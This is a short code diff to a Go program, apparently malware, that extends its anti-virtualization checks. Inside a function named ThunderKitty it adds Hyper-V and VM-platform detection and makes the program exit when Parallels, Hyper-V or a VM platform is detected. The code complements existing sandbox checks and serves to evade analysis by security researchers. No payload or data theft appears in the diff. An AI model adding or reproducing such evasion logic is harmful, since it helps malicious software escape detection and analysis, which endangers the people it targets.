@@ -27,6 +27,8 @@ import (
     "github.com/EvilBytecode/GoDefender/AntiVirtualization/ShadowDefenderDetection"
     "github.com/EvilBytecode/GoDefender/AntiVirtualization/SandboxieDetection"
     "github.com/EvilBytecode/GoDefender/AntiVirtualization/DeepFreezeDetection"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/HyperVCheck"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/VMPlatformCheck"	
 )
 
 func ThunderKitty() {
@@ -84,6 +86,18 @@ func ThunderKitty() {
 
 	if pararelcheck, _ := ParallelsCheck.CheckForParallels(); pararelcheck {
 		log.Println("[DEBUG] Parallels detected. Exiting")
+		os.Exit(-1)
+	}
+
+	// Hyper-V detection
+	if hypervDetected, _ := HyperVCheck.DetectHyperV(); hypervDetected {
+		log.Println("[DEBUG] Hyper-V detected")
+		os.Exit(-1)
+	}
+
+	// VMPlatform detection
+	if vmPlatformDetected, _ := VMPlatformCheck.DetectVMPlatform(); vmPlatformDetected {
+		log.Println("[DEBUG] VM Platform detected")
 		os.Exit(-1)
 	}
 
